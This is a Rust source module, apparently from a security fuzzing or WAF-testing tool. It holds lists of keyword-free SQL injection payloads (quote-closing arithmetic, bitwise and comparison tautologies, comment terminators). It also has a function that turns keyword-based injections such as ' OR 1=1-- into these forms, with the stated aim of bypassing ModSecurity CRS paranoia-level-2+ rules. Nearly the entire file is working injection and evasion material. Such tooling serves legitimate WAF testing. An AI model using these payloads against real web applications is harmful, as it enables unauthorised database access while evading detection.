//! Keyword-free SQL injection payloads for high-paranoia WAF bypass.
//!
//! These payloads contain NO SQL keywords (no SELECT, UNION, OR, AND, LIKE, etc.)
//! and bypass anomaly-scored WAFs (ModSecurity CRS PL2+) because they exploit
//! arithmetic and type-coercion behavior in SQL engines without triggering
//! keyword-based or anomaly-based detection rules.

use crate::grammar::sql::common::SqlMutation;

/// Arithmetic tautologies that evaluate to true in SQL without using keywords.
/// These bypass CRS PL2+ because they contain no SQL reserved words.
pub(crate) const KEYWORDLESS_TAUTOLOGIES: &[(&str, &str)] = &[
    // Pure arithmetic — no keywords at all
    ("1-0", "arithmetic_sub"),
    ("1*1", "arithmetic_mul"),
    ("1-false", "arithmetic_false"),
    ("1-true", "arithmetic_true"),
    ("0+1", "arithmetic_add"),
    ("1%2b0", "arithmetic_urlencode_plus"),
    ("1/1", "arithmetic_div"),
    ("1%1", "arithmetic_mod"),
    ("~~1", "double_bitwise_not"),
    ("1^0", "bitwise_xor"),
    ("1|0", "bitwise_or"),
    ("1&1", "bitwise_and"),
    ("0--1", "double_minus"),
    ("1<<0", "left_shift"),
    ("1>>0", "right_shift"),
    // Numeric comparison without keywords
    ("1>0", "gt_compare"),
    ("0<1", "lt_compare"),
    ("1>=1", "gte_compare"),
    ("1<=1", "lte_compare"),
    ("1!=0", "neq_compare"),
    ("1<>0", "ltgt_compare"),
    // Scientific notation
    ("1e0", "scientific"),
    ("0.1e1", "scientific_decimal"),
    // Hex comparisons
    ("0x1", "hex_one"),
    ("0x31=0x31", "hex_compare"),
];

/// Full keyword-free injection payloads designed for WHERE clause injection.
/// Each payload closes a quoted context and adds a keyword-free tautology.
pub(crate) const KEYWORDLESS_INJECTIONS: &[(&str, &str)] = &[
    // Quote-close + arithmetic tautology (most likely to bypass PL2+)
    ("'+0+'", "quote_arith_zero"),
    ("'-0-'", "quote_arith_sub"),
    ("'*1*'", "quote_arith_mul"),
    ("'/1/'", "quote_arith_div"),
    ("'%2b0%2b'", "quote_arith_urlplus"),
    // Numeric context tautologies
    ("1-0", "numeric_sub"),
    ("1*1", "numeric_mul"),
    ("0+1", "numeric_add"),
    ("1/1", "numeric_div"),
    ("~~1", "numeric_bitnot"),
    // Double-minus trick (breaks SQL comment, acts as subtraction)
    ("1--1", "double_minus_trick"),
    // Close string and multiply by 1 (identity operation)
    ("'+'", "empty_concat"),
    ("''+'", "empty_concat_plus"),
    // Comparison without keywords (numeric context)
    ("1>0#", "gt_comment"),
    ("0<1#", "lt_comment"),
    ("1>=1--", "gte_terminator"),
    ("1!=0--", "neq_terminator"),
    // Boolean coercion (database-dependent)
    ("!0", "bool_not_zero"),
    ("!!1", "double_not"),
    // Bitwise operations
    ("1^0", "xor_tautology"),
    ("1|0", "or_bitwise"),
    ("1&1", "and_bitwise"),
    // Type coercion
    ("0.0=0", "type_coerce_float"),
    ("0e0=0", "type_coerce_sci"),
];

/// Generate keyword-free SQL mutations for high-paranoia WAF bypass.
///
/// These mutations strip SQL keywords from the payload and replace them with
/// arithmetic equivalents that achieve the same logical effect.
pub(crate) fn keywordless_mutations(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let mut results = Vec::new();
    let base = payload
        .trim_end_matches("--")
        .trim_end_matches('#')
        .trim_end_matches("/*")
        .trim();

    // Strategy 1: Replace the whole payload with keyword-free injections
    for (injection, rule) in KEYWORDLESS_INJECTIONS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: (*injection).to_string(),
            description: format!("keyword-free injection: {injection}"),
            rules_applied: vec!["keywordless", rule],
        });
    }

    // Strategy 2: If the payload has a tautology with keywords, replace with arithmetic
    let lower = base.to_ascii_lowercase();
    if (lower.contains(" or ") || lower.contains("||")) && results.len() < max_mutations {
        // Strip the keyword-based tautology and replace with arithmetic
        for (arith, rule) in KEYWORDLESS_TAUTOLOGIES {
            if results.len() >= max_mutations {
                break;
            }
            // Build payload: close quote + arithmetic
            let variant = format!("'+{arith}+'");
            results.push(SqlMutation {
                payload: variant.clone(),
                description: format!("keyword-free tautology: {arith}"),
                rules_applied: vec!["keywordless_tautology", rule],
            });
        }
    }

    // Strategy 3: Arithmetic probes for numeric parameter contexts
    for (arith, rule) in KEYWORDLESS_TAUTOLOGIES {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: (*arith).to_string(),
            description: format!("arithmetic probe: {arith}"),
            rules_applied: vec!["arithmetic_probe", rule],
        });
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn keywordless_tautologies_contain_no_sql_keywords() {
        let sql_keywords = [
            "select", "union", "insert", "update", "delete", "drop", "where", "from",
            "order", "group", "having", "like", "between", "case", "when", "then",
            "else", "end", "join", "left", "right", "inner", "outer", "null",
            "is", "not", "and", "or", "in", "exists", "into", "values", "set",
            "alter", "create", "table", "database", "schema", "exec", "execute",
            "waitfor", "sleep", "benchmark", "if", "iif",
        ];
        for (tautology, _) in KEYWORDLESS_TAUTOLOGIES {
            let lower = tautology.to_ascii_lowercase();
            for keyword in &sql_keywords {
                assert!(
                    !lower.contains(keyword) || lower.contains("false") || lower.contains("true"),
                    "Tautology '{tautology}' contains SQL keyword '{keyword}'"
                );
            }
        }
    }

    #[test]
    fn keywordless_injections_contain_no_dangerous_keywords() {
        let dangerous_keywords = [
            "select", "union", "insert", "update", "delete", "drop",
            "where", "from", "order", "group", "having",
        ];
        for (injection, _) in KEYWORDLESS_INJECTIONS {
            let lower = injection.to_ascii_lowercase();
            for keyword in &dangerous_keywords {
                assert!(
                    !lower.contains(keyword),
                    "Injection '{injection}' contains SQL keyword '{keyword}'"
                );
            }
        }
    }

    #[test]
    fn generates_mutations() {
        let mutations = keywordless_mutations("' OR 1=1--", 50);
        assert!(!mutations.is_empty());
        assert!(mutations.len() <= 50);
    }

    #[test]
    fn mutations_have_correct_rules() {
        let mutations = keywordless_mutations("' OR 1=1--", 10);
        for m in &mutations {
            assert!(
                m.rules_applied.contains(&"keywordless")
                    || m.rules_applied.contains(&"keywordless_tautology")
                    || m.rules_applied.contains(&"arithmetic_probe"),
                "Unexpected rule: {:?}",
                m.rules_applied
            );
        }
    }

    #[test]
    fn tautology_count() {
        assert!(
            KEYWORDLESS_TAUTOLOGIES.len() >= 20,
            "Expected at least 20 keyword-free tautologies"
        );
    }
}
